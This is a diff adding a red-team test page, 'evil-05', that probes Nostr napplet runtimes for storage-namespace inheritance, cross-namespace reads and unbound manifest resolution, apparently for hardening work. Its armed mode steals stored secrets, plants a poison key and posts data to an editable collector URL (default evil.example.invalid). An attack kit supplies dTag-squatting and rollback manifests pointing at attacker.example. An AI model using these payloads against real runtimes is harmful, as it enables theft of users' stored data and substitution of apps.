@@ -1,0 +1,718 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>evil-05 Nostr-level substitution</title>
+<meta name="description" content="Red-team napplet: unbound dTag resolution, replaceable rollback, and storage namespace squatting — a substituted napplet inherits its victim's stored data.">
+<meta name="napplet-id" content="evil-05-substitution">
+<!--
+  evil-napplets ROE (see repo README):
+  - demo mode: probe + masked evidence only. no writes outside this frame
+    (one immediately-cleaned marker key proves storage, nothing else),
+    no network, no signing, no navigation, no persistence.
+  - VERY EVIL mode: in-napplet arming + stern confirmation that describes
+    every armed payload exactly + typed EXECUTE EVIL, then real execution.
+  - default collector is https://evil.example.invalid/collect (RFC 2606,
+    non-resolving): even in VERY EVIL mode nothing leaves the machine.
+-->
+<style>
+  :root {
+    --bg: #120f16;
+    --fg: #e9e6f2;
+    --primary: #ff5470;
+    --ok: #3fd68f;
+    --warn: #ffb454;
+    --muted: #8d88a3;
+    --danger: #ff5470;
+    --surface: color-mix(in srgb, var(--bg) 88%, var(--fg));
+    --border: color-mix(in srgb, var(--fg) 16%, transparent);
+    --space-1: 4px;
+    --space-2: 8px;
+    --space-3: 12px;
+    --control-h: 28px;
+    --radius: 6px;
+    color-scheme: dark;
+    font: 12.5px/1.45 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  html, body { height: 100%; margin: 0; }
+  #app {
+    container-type: inline-size;
+    height: 100%;
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: column;
+    gap: var(--space-2);
+    padding: var(--space-2);
+    background: var(--bg);
+    color: var(--fg);
+    user-select: none;
+  }
+  .toolbar {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: var(--space-1);
+    min-height: var(--control-h);
+    flex: 0 0 auto;
+  }
+  .summary {
+    color: var(--muted);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .summary b { color: var(--danger); }
+  .summary .ok-count { color: var(--ok); }
+  .summary .sent-count { color: var(--warn); }
+  .spacer { flex: 1; }
+  button {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    cursor: pointer;
+    font: inherit;
+    height: var(--control-h);
+    padding: 0 10px;
+    white-space: nowrap;
+  }
+  button:hover:not(:disabled) { border-color: var(--primary); color: var(--primary); }
+  button:disabled { opacity: .45; cursor: default; }
+  button.arm { border-color: color-mix(in srgb, var(--danger) 60%, var(--border)); color: var(--danger); font-weight: 700; }
+  #rows {
+    flex: 1 1 auto;
+    min-height: 0;
+    overflow: auto;
+    display: grid;
+    grid-auto-rows: min-content;
+    gap: var(--space-1);
+    align-content: start;
+  }
+  @container (min-width: 760px) { #rows { grid-template-columns: 1fr 1fr; } }
+  @container (min-width: 1200px) { #rows { grid-template-columns: 1fr 1fr 1fr; } }
+  .attack {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    background: color-mix(in srgb, var(--surface) 30%, transparent);
+  }
+  .attack.armed, .attack.sent { border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); }
+  .attack-head { display: flex; align-items: center; gap: var(--space-2); flex-wrap: wrap; }
+  .attack-name { font-weight: 700; }
+  .attack-target { color: var(--muted); font-size: 11px; }
+  .chip {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 1px 6px;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: .04em;
+    white-space: nowrap;
+  }
+  .chip.status-armed { color: var(--danger); border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); background: color-mix(in srgb, var(--danger) 12%, transparent); }
+  .chip.status-blocked { color: var(--ok); border-color: color-mix(in srgb, var(--ok) 45%, var(--border)); background: color-mix(in srgb, var(--ok) 10%, transparent); }
+  .chip.status-sent { color: var(--warn); border-color: color-mix(in srgb, var(--warn) 55%, var(--border)); background: color-mix(in srgb, var(--warn) 12%, transparent); }
+  .chip.status-na { color: var(--muted); }
+  .chip.sev-critical { color: var(--danger); }
+  .chip.sev-high { color: var(--warn); }
+  .chip.sev-info { color: var(--muted); }
+  .evidence {
+    color: var(--muted);
+    font-size: 11px;
+    user-select: text;
+    overflow-wrap: anywhere;
+  }
+  .row-actions { display: flex; gap: var(--space-1); }
+  .row-actions button { height: 22px; padding: 0 8px; font-size: 11px; }
+  #evilPanel {
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: var(--radius);
+    background: color-mix(in srgb, var(--danger) 8%, var(--surface));
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    max-height: 40%;
+    overflow: auto;
+    flex: 0 0 auto;
+  }
+  #evilPanel h2 { margin: 0; font-size: 11px; text-transform: uppercase; letter-spacing: .06em; color: var(--danger); }
+  .evil-log { font-size: 11px; white-space: pre-wrap; user-select: text; color: var(--fg); }
+  #reportBox { display: grid; gap: var(--space-1); flex: 0 0 auto; }
+  details#report, details#kit { border: 1px solid var(--border); border-radius: var(--radius); padding: var(--space-2); }
+  details#report summary, details#kit summary { cursor: pointer; color: var(--muted); }
+  #reportText {
+    box-sizing: border-box;
+    width: 100%;
+    min-height: 90px;
+    resize: vertical;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: 11px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    padding: var(--space-1);
+    user-select: text;
+  }
+  .kit-entry { margin-bottom: var(--space-2); }
+  .kit-entry .kit-label { color: var(--warn); font-size: 11px; }
+  .kit-entry .kit-note { color: var(--muted); font-size: 11px; margin: 2px 0; }
+  .kit-entry pre {
+    margin: 0;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-1);
+    overflow: auto;
+    font: 10.5px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    user-select: text;
+    max-height: 140px;
+  }
+  dialog {
+    background: var(--bg);
+    color: var(--fg);
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: 8px;
+    padding: var(--space-3);
+    max-width: min(640px, 92vw);
+    max-height: 86dvh;
+    overflow: auto;
+  }
+  dialog::backdrop { background: rgba(10, 6, 12, .8); }
+  dialog h2 { margin: 0 0 var(--space-2); color: var(--danger); font-size: 14px; text-transform: uppercase; letter-spacing: .08em; }
+  .stern { border: 1px solid var(--danger); border-radius: var(--radius); padding: var(--space-2); color: var(--danger); font-weight: 700; margin: 0 0 var(--space-2); }
+  .plan-list { margin: 0 0 var(--space-2); padding-left: 18px; }
+  .plan-list li { margin-bottom: var(--space-2); }
+  .plan-list b { color: var(--danger); }
+  label { display: block; color: var(--muted); font-size: 11px; margin-bottom: var(--space-1); }
+  input[type="text"], input[type="url"] {
+    box-sizing: border-box;
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: inherit;
+    padding: 4px 8px;
+  }
+  dialog .confirm-row { display: flex; gap: var(--space-1); align-items: center; margin-top: var(--space-2); flex-wrap: wrap; }
+  #confirmBtn { border-color: var(--danger); color: var(--danger); font-weight: 700; }
+  #confirmBtn:not(:disabled):hover { background: var(--danger); color: var(--bg); }
+  .muted { color: var(--muted); font-size: 11px; }
+  @media (max-height: 240px) { .toolbar button .btn-label-long { display: none; } #reportBox { display: none; } }
+  @container (max-width: 300px) { .attack-target { display: none; } }
+</style>
+</head>
+<body>
+<div id="app">
+  <div class="toolbar">
+    <span id="summary" class="summary">probing…</span>
+    <span class="spacer"></span>
+    <button id="runAllBtn" type="button">run all</button>
+    <button id="reportBtn" type="button">report</button>
+    <button id="armBtn" class="arm" type="button">ARM VERY EVIL MODE</button>
+  </div>
+  <div id="rows"></div>
+  <div id="evilPanel" hidden>
+    <h2>VERY EVIL MODE — execution log</h2>
+    <div id="evilLog" class="evil-log"></div>
+  </div>
+  <div id="reportBox">
+    <details id="report">
+      <summary>report (JSON)</summary>
+      <textarea id="reportText" rows="6" spellcheck="false"></textarea>
+      <div class="row-actions" style="margin-top: 6px;">
+        <button id="copyReportBtn" type="button">copy report</button>
+      </div>
+    </details>
+  </div>
+</div>
+
+<dialog id="confirmDlg" aria-labelledby="confirmTitle">
+  <form method="dialog" style="display:grid; gap: 0;">
+    <h2 id="confirmTitle">⚠ VERY EVIL MODE — final confirmation</h2>
+    <p class="stern">THIS WILL ACTUALLY EXECUTE THE ATTACKS. NOT A DRILL.</p>
+    <p class="muted">Every armed attack below will run for real, in this order (destructive payloads last). Where payloads egress, data leaves this frame toward the collector URL. Only a hardened runtime will stop them.</p>
+    <ol id="planList" class="plan-list"></ol>
+    <label>collector / exfiltration destination (edit to point at your own)
+      <input id="collectorInput" type="url" spellcheck="false">
+    </label>
+    <label>type <b style="color: var(--danger);">EXECUTE EVIL</b> exactly, case-sensitive, to enable the button
+      <input id="confirmInput" type="text" autocomplete="off" spellcheck="false" placeholder="EXECUTE EVIL">
+    </label>
+    <div class="confirm-row">
+      <button id="confirmBtn" type="button" disabled>EXECUTE — DO EVIL</button>
+      <button value="cancel" type="submit" style="align-self: center;">cancel — stay demo</button>
+    </div>
+  </form>
+</dialog>
+
+<script>
+'use strict';
+(function () {
+  window.__EVIL_ID__ = 'evil-05-substitution';
+  const DEFAULT_COLLECTOR = 'https://evil.example.invalid/collect';
+  const CONFIRM_PHRASE = 'EXECUTE EVIL';
+  const state = {
+    results: {},     // id -> { status, evidence }
+    evilResults: {}, // id -> object evidence of the real execution
+    veryEvil: false,
+    collector: DEFAULT_COLLECTOR,
+  };
+
+  const app = document.getElementById('app');
+  const rowsEl = document.getElementById('rows');
+  const summaryEl = document.getElementById('summary');
+  const evilPanel = document.getElementById('evilPanel');
+  const evilLog = document.getElementById('evilLog');
+  const armBtn = document.getElementById('armBtn');
+  const confirmDlg = document.getElementById('confirmDlg');
+  const confirmInput = document.getElementById('confirmInput');
+  const confirmBtn = document.getElementById('confirmBtn');
+  const collectorInput = document.getElementById('collectorInput');
+  const planList = document.getElementById('planList');
+  const reportText = document.getElementById('reportText');
+
+  /* ---------- shared helpers ---------- */
+
+  function errMsg(e) {
+    if (!e) return String(e);
+    if (typeof e === 'string') return e;
+    return (e.name ? e.name + ': ' : '') + (e.message || String(e));
+  }
+  function mask(v, keep) {
+    keep = keep || 6;
+    const s = String(v);
+    if (s.length <= keep) return s.slice(0, 1) + '…';
+    return s.slice(0, keep) + '… (' + s.length + ' chars, masked)';
+  }
+  function randId() {
+    try { return crypto.randomUUID().slice(0, 8); }
+    catch (_) { return Math.random().toString(16).slice(2, 10); }
+  }
+  function withTimeout(promise, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const t = setTimeout(() => resolve('timeout'), ms);
+      Promise.resolve(promise).then(
+        (v) => { clearTimeout(t); resolve(v); },
+        (e) => { clearTimeout(t); resolve({ __rejected: errMsg(e) }); }
+      );
+    });
+  }
+  function blocked(evidence) { return { status: 'blocked', evidence: evidence }; }
+  function armed(evidence) { return { status: 'armed', evidence: evidence }; }
+  function na(evidence) { return { status: 'na', evidence: evidence }; }
+  function sent(evidence) { return { status: 'sent', evidence: evidence }; }
+  function safeGet(fn) {
+    try { return fn(); } catch (e) { return 'denied: ' + errMsg(e); }
+  }
+  function findNostr() {
+    if (window.nostr) return window.nostr;
+    try { if (window.parent && window.parent.nostr) return window.parent.nostr; } catch (_) { /* cross-origin: held */ }
+    return null;
+  }
+  function captureSummary() {
+    return JSON.stringify({
+      origin: safeGet(() => window.origin),
+      href: safeGet(() => location.href),
+      referrer: document.referrer,
+      parentLength: safeGet(() => window.parent.length),
+      at: new Date().toISOString(),
+    });
+  }
+  async function sendToCollector(kind, data) {
+    const url = state.collector;
+    const body = JSON.stringify({ kind: kind, at: new Date().toISOString(), data: data });
+    try {
+      const r = await withTimeout(fetch(url, { method: 'POST', mode: 'no-cors', body: body }), 4000);
+      if (r === 'timeout') return 'fetch timed out';
+      if (r && r.__rejected) return 'network egress failed: ' + r.__rejected;
+      return 'request dispatched to collector (opaque response) — egress channel OPEN';
+    } catch (e) {
+      return 'network egress failed: ' + errMsg(e) + ' — runtime/CSP held';
+    }
+  }
+  function postParent(msg) { window.parent.postMessage(msg, '*'); }
+  function waitForMsg(id, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      let done = false;
+      const on = (e) => {
+        if (e.data && e.data.id === id) {
+          cleanup(); resolve(e.data);
+        }
+      };
+      function cleanup() { window.removeEventListener('message', on); }
+      window.addEventListener('message', on);
+      setTimeout(() => { if (!done) { done = true; cleanup(); resolve('timeout'); } }, ms);
+    });
+  }
+  function pingOnce() {
+    return new Promise((resolve) => {
+      const id = 'evil-ping-' + randId();
+      const t = performance.now();
+      const sentWall = Date.now();
+      const on = (e) => {
+        const d = e.data;
+        if (d && d.type === 'evil.pong' && d.id === id) {
+          window.removeEventListener('message', on);
+          resolve({
+            rtt: performance.now() - t,
+            // wall-clock (shared epoch) so shell-side starvation is measurable
+            shellDelay: typeof d.shellEchoedAt === 'number' ? d.shellEchoedAt - sentWall : null,
+          });
+        }
+      };
+      window.addEventListener('message', on);
+      window.parent.postMessage({ type: 'evil.ping', id: id, sentWall: sentWall }, '*');
+      setTimeout(() => { window.removeEventListener('message', on); resolve(null); }, 5000);
+    });
+  }
+  async function pingRTT(samples) {
+    samples = samples || 5;
+    const out = [];
+    for (let i = 0; i < samples; i++) {
+      const p = await pingOnce();
+      if (p && p.rtt >= 0) out.push(p.rtt);
+    }
+    return out.sort((a, b) => a - b);
+  }
+
+  // evil-05 — Nostr-level substitution (tier 2). NIP-5D says the runtime must
+// "resolve the napplet manifest event and verify its signature" — but never
+// binds a named napplet (kind 35129 / replaceable 15129) to WHOSE key, nor
+// says how storage namespaces key. This artifact is the substituted heir:
+// it runs where the victim used to, and looks for its inheritance.
+window.__EVIL_KIT__ = [
+  {
+    label: 'attacker-keyed manifest squatting the victim dTag',
+    note: 'NIP-5D never binds a named napplet (35129) to a publisher. A runtime resolving by dTag alone accepts whichever manifest a relay serves first — attacker publishes this from their own key and SUBSTITUTES the napplet. Verify the publisher pubkey out-of-band or pin it.',
+    data: {
+      kind: 35129,
+      pubkey: 'ATTACKER_PUBKEY_HEX',
+      content: 'A feed viewer and editor hosted on Nostr (totally the real one)',
+      tags: [
+        ['d', 'legit-napplet-dtag-squatted'],
+        ['x', '186ea5fd14e88fd1ac49351759e7ab906fa94892002b60bf7f5a428f28ca1c99'],
+        ['server', 'https://attacker.example/blossom'],
+      ],
+    },
+  },
+  {
+    label: 'rollback / replay manifest (old created_at)',
+    note: 'kind 15129/35129 are replaceable and NIP-5D has no freshness rule (latest? created_at pinning? last-known-good?). A hostile relay serves an OLD version of this manifest — pin known versions or require freshness windows.',
+    data: {
+      kind: 15129,
+      created_at: 1234567890,
+      content: 'an old, previously-valid version — rolled back on you',
+      tags: [
+        ['x', '186ea5fd14e88fd1ac49351759e7ab906fa94892002b60bf7f5a428f28ca1c99'],
+        ['server', 'https://attacker.example/blossom'],
+      ],
+    },
+  },
+];
+
+const ATTACKS = [
+  {
+    id: 'inherited-storage',
+    name: 'storage namespace inheritance',
+    target: 'storage namespacing is unspecified in NIP-5D (NAP-STORAGE)',
+    severity: 'critical',
+    harm: 'If the runtime namespaces storage by dTag (or globally, or across versions of one napplet), a substituted napplet INHERITS the victim\'s stored user data, and a version bump inherits its predecessor\'s secrets. Data theft with no escape needed — the runtime hands it over.',
+    evilBrief: 'Exfiltrates whatever stored secrets are visible through the injected storage namespace (the inherited __evil05_secret__ plus any keys present) to the collector, then writes __evil05_poison__ into the namespace for the NEXT heir to inherit.',
+    async demo() {
+      const st = window.napplet && window.napplet.storage;
+      if (!st) return na('no injected storage domain — no namespace to inherit (inheritance channel absent, nothing to steal)');
+      try {
+        const v = await withTimeout(st.get('__evil05_secret__'), 3000);
+        if (v && v !== 'timeout' && !(v && v.__rejected)) {
+          return armed('INHERITED ' + JSON.stringify(mask(v, 24)) + ' from a PREDECESSOR/VICTIM namespace — storage is shared across artifact identity: substitution = full stored-data theft');
+        }
+        return blocked('namespace is isolated — no inherited secret visible (storage bound to artifact identity, substitution gains nothing)');
+      } catch (e) {
+        const m = errMsg(e);
+        if (/no such|not found|timeout/i.test(m)) {
+          return blocked('namespace is isolated — no inherited secret visible (storage bound to artifact identity)');
+        }
+        return na('storage error: ' + m);
+      }
+    },
+    async evil() {
+      const st = window.napplet && window.napplet.storage;
+      const out = {};
+      if (!st) { out.error = 'no injected storage domain'; return out; }
+      const keys = [];
+      try {
+        const secret = await withTimeout(st.get('__evil05_secret__'), 3000);
+        if (secret && secret !== 'timeout' && !secret.__rejected) {
+          out.inheritedSecret = String(secret);
+          keys.push('__evil05_secret__');
+        }
+      } catch (e) { out.getError = errMsg(e); }
+      try {
+        await st.set('__evil05_poison__', 'attacker-data-for-the-next-heir');
+        out.poisoned = '__evil05_poison__ written into the shared namespace — the NEXT napplet version (or the returned legit napplet) inherits it';
+      } catch (e) { out.setError = errMsg(e); }
+      out.exfil = await sendToCollector('substitution-inheritance', { inherited: out.inheritedSecret || null, keys: keys });
+      return out;
+    },
+  },
+  {
+    id: 'cross-namespace-read',
+    name: 'cross-namespace read probe',
+    target: 'namespace policy: dTag vs (dTag, artifactHash) vs global',
+    severity: 'critical',
+    harm: 'A GLOBAL or dTag-only namespace lets any napplet read any napplet\'s data — full cross-napplet disclosure.',
+    async demo() {
+      const st = window.napplet && window.napplet.storage;
+      if (!st) return na('no injected storage domain');
+      const markers = ['__evil03_spoof_trap__', '__evil04_kit_xss__', '__evil05_cross__'];
+      const found = [];
+      for (const k of markers) {
+        try {
+          const v = await withTimeout(st.get(k), 1200);
+          if (v && v !== 'timeout' && !v.__rejected) found.push(k + '=' + mask(v, 12));
+        } catch (_) { /* not visible */ }
+      }
+      return found.length
+        ? armed('read keys belonging to OTHER napplets\' namespaces: ' + found.join(', ') + ' — namespace leaks across napplet identities')
+        : blocked('no cross-namespace keys visible — namespaces hold (at least on this key set)');
+    },
+    async evil() {
+      const st = window.napplet && window.napplet.storage;
+      const out = { found: [] };
+      if (!st) { out.error = 'no injected storage domain'; return out; }
+      for (const k of ['__evil05_secret__', '__evil06_seeded__', '__harness_canary__']) {
+        try {
+          const v = await withTimeout(st.get(k), 1500);
+          if (v && v !== 'timeout' && !v.__rejected) out.found.push({ key: k, value: mask(v, 32) });
+        } catch (_) { /* skip */ }
+      }
+      out.exfil = await sendToCollector('cross-namespace-read', out.found);
+      return out;
+    },
+  },
+  {
+    id: 'dtag-unbound',
+    name: 'dTag resolution binding',
+    target: '"Resolve the napplet manifest event (…5129/15129/35129…) and verify its signature"',
+    severity: 'critical',
+    harm: 'The clause never says WHOSE signature. A runtime resolving by dTag (or accepting any valid event for the d) accepts an attacker-keyed manifest — the attacker becomes the napplet. This frame cannot see resolution from inside; this is a shell-side kit attack.',
+    async demo() {
+      return na('unverifiable from inside the frame — resolution happens shell-side before load. Use the kit: publish the attacker-keyed manifest from your own key with this dTag, point a by-dTag-resolving runtime at it, and see what loads');
+    },
+    async evil() {
+      const out = { note: 'no in-frame payload: dTag binding is a shell-side flaw. The kit manifest substitutes this napplet wherever resolution is unbound' };
+      out.exfil = await sendToCollector('substitution-claim', { dTag: window.__EVIL_ID__, href: safeGet(() => location.href) });
+      return out;
+    },
+  },
+];
+
+
+  /* ---------- rendering ---------- */
+
+  function sevChip(sev) {
+    const s = sev === 'critical' ? 'sev-critical' : sev === 'high' ? 'sev-high' : 'sev-info';
+    return '<span class="chip ' + s + '">' + sev + '</span>';
+  }
+  function statusChip(st) {
+    const label = st === 'armed' ? 'ARMED' : st === 'blocked' ? 'HELD' : st === 'sent' ? 'SENT' : st === 'na' ? 'N/A' : st || '—';
+    return '<span class="chip status-' + (st || 'na') + '">' + label + '</span>';
+  }
+  function esc(s) {
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
+  }
+  function renderRows() {
+    rowsEl.innerHTML = '';
+    for (const a of ATTACKS) {
+      const r = state.results[a.id] || {};
+      const div = document.createElement('div');
+      div.className = 'attack' + (r.status === 'armed' || r.status === 'sent' ? ' ' + r.status : '');
+      div.dataset.attack = a.id;
+      div.dataset.status = r.status || 'pending';
+      div.innerHTML =
+        '<div class="attack-head">' +
+          statusChip(r.status) +
+          '<span class="attack-name">' + esc(a.name) + '</span>' +
+          sevChip(a.severity) +
+          '<span class="spacer"></span>' +
+          '<div class="row-actions"><button data-probe="' + a.id + '" type="button">probe</button></div>' +
+        '</div>' +
+        '<div class="attack-target">' + esc(a.target) + '</div>' +
+        '<div class="evidence">' + esc(r.evidence || 'not probed') + '</div>';
+      rowsEl.appendChild(div);
+    }
+    rowsEl.querySelectorAll('button[data-probe]').forEach((b) => {
+      b.addEventListener('click', () => runDemo(b.dataset.probe));
+    });
+  }
+  function renderSummary() {
+    const counts = { armed: 0, blocked: 0, na: 0, sent: 0 };
+    for (const a of ATTACKS) {
+      const s = (state.results[a.id] || {}).status;
+      if (counts[s] != null) counts[s]++;
+    }
+    summaryEl.innerHTML = state.veryEvil
+      ? '<b>VERY EVIL MODE ACTIVE</b> · payloads executed'
+      : 'demo mode · <b>' + counts.armed + ' armed</b> / <span class="ok-count">' + counts.blocked + ' held</span> / <span class="sent-count">' + counts.sent + ' sent</span> / ' + counts.na + ' n/a';
+    const armable = counts.armed + counts.sent;
+    armBtn.disabled = armable === 0;
+    armBtn.title = armable === 0 ? 'nothing armed — runtime held every probe' : armable + ' attack(s) armable';
+  }
+  function renderKit() {
+    const kit = window.__EVIL_KIT__;
+    if (!kit || !kit.length) return;
+    const d = document.createElement('details');
+    d.id = 'kit';
+    d.innerHTML = '<summary>attack kit — crafted inputs (copy)</summary>';
+    for (const entry of kit) {
+      const div = document.createElement('div');
+      div.className = 'kit-entry';
+      div.innerHTML =
+        '<div class="kit-label">' + esc(entry.label) + '</div>' +
+        (entry.note ? '<div class="kit-note">' + esc(entry.note) + '</div>' : '') +
+        '<pre>' + esc(typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2)) + '</pre>' +
+        '<div class="row-actions"><button type="button">copy</button></div>';
+      div.querySelector('button').addEventListener('click', () => {
+        const text = typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2);
+        try { void navigator.clipboard.writeText(text); } catch (_) { /* clipboard denied */ }
+      });
+      d.appendChild(div);
+    }
+    document.getElementById('reportBox').before(d);
+  }
+  function render() { renderRows(); renderSummary(); }
+
+  async function runDemo(id) {
+    const a = ATTACKS.find((x) => x.id === id);
+    if (!a) return;
+    state.results[id] = { status: 'pending', evidence: 'probing…' };
+    render();
+    try {
+      state.results[id] = await a.demo();
+    } catch (e) {
+      state.results[id] = { status: 'na', evidence: 'probe error: ' + errMsg(e) };
+    }
+    render();
+    updateReport();
+  }
+  async function runAllDemos() {
+    for (const a of ATTACKS) await runDemo(a.id);
+  }
+
+  /* ---------- VERY EVIL ---------- */
+
+  function planOrder() {
+    const plain = ATTACKS.filter((a) => a.evil && !a.destructive);
+    const last = ATTACKS.filter((a) => a.evil && a.destructive);
+    return plain.concat(last);
+  }
+  function openConfirm() {
+    const armable = planOrder().filter((a) => {
+      const s = (state.results[a.id] || {}).status;
+      return s === 'armed' || s === 'sent';
+    });
+    if (!armable.length) return;
+    planList.innerHTML = '';
+    for (const a of armable) {
+      const li = document.createElement('li');
+      li.innerHTML = '<b>' + esc(a.name) + '</b> — ' + esc(a.evilBrief || a.harm);
+      planList.appendChild(li);
+    }
+    collectorInput.value = state.collector;
+    confirmInput.value = '';
+    confirmBtn.disabled = true;
+    confirmDlg.showModal();
+  }
+  collectorInput.addEventListener('input', () => { state.collector = collectorInput.value.trim() || DEFAULT_COLLECTOR; });
+  confirmInput.addEventListener('input', () => { confirmBtn.disabled = confirmInput.value !== CONFIRM_PHRASE; });
+
+  confirmBtn.addEventListener('click', async () => {
+    confirmDlg.close();
+    await executeVeryEvil();
+  });
+
+  async function executeVeryEvil() {
+    state.veryEvil = true;
+    evilPanel.hidden = false;
+    evilLog.textContent = '';
+    const logLine = (s) => {
+      evilLog.textContent += '[' + new Date().toISOString() + '] ' + s + '\n';
+      evilLog.scrollTop = evilLog.scrollHeight;
+    };
+    logLine('VERY EVIL MODE — executing armed payloads against ' + safeGet(() => location.href));
+    logLine('collector: ' + state.collector);
+    renderSummary();
+    for (const a of planOrder()) {
+      const st = (state.results[a.id] || {}).status;
+      if (st !== 'armed' && st !== 'sent') {
+        state.evilResults[a.id] = { skipped: 'not armed (' + (st || 'unprobed') + ') — runtime holds' };
+        logLine('SKIP ' + a.name + ' — not armable, the runtime holds');
+        updateReport();
+        continue;
+      }
+      logLine('RUN  ' + a.name + ' — ' + (a.evilBrief || a.harm));
+      try {
+        state.evilResults[a.id] = await a.evil();
+        logLine('DONE ' + a.name + ' → ' + JSON.stringify(state.evilResults[a.id]).slice(0, 400));
+      } catch (e) {
+        state.evilResults[a.id] = { error: errMsg(e) };
+        logLine('ERR  ' + a.name + ' → ' + errMsg(e));
+      }
+      updateReport();
+      renderSummary();
+    }
+    logLine('finished. everything above actually happened.');
+    updateReport();
+  }
+
+  /* ---------- report ---------- */
+
+  function buildReport() {
+    return {
+      napplet: window.__EVIL_ID__ || 'unknown',
+      mode: state.veryEvil ? 'VERY-EVIL' : 'demo',
+      at: new Date().toISOString(),
+      collector: state.collector,
+      location: safeGet(() => location.href),
+      origin: safeGet(() => window.origin),
+      referrer: document.referrer,
+      parentLength: safeGet(() => window.parent.length),
+      findings: ATTACKS.map((a) => Object.assign({ id: a.id, name: a.name, severity: a.severity }, state.results[a.id] || {}, { evil: state.evilResults[a.id] || null })),
+    };
+  }
+  function updateReport() {
+    reportText.value = JSON.stringify(buildReport(), null, 2);
+  }
+  document.getElementById('copyReportBtn').addEventListener('click', async () => {
+    try {
+      await navigator.clipboard.writeText(reportText.value);
+    } catch (_) {
+      reportText.select();
+    }
+  });
+  document.getElementById('reportBtn').addEventListener('click', () => {
+    const d = document.getElementById('report');
+    d.open = !d.open;
+  });
+
+  armBtn.addEventListener('click', () => { updateReport(); openConfirm(); });
+  document.getElementById('runAllBtn').addEventListener('click', () => { void runAllDemos(); });
+
+  /* ---------- boot ---------- */
+  renderKit();
+  render();
+  updateReport();
+  void runAllDemos();
+})();
+</script>
+</body>
+</html>
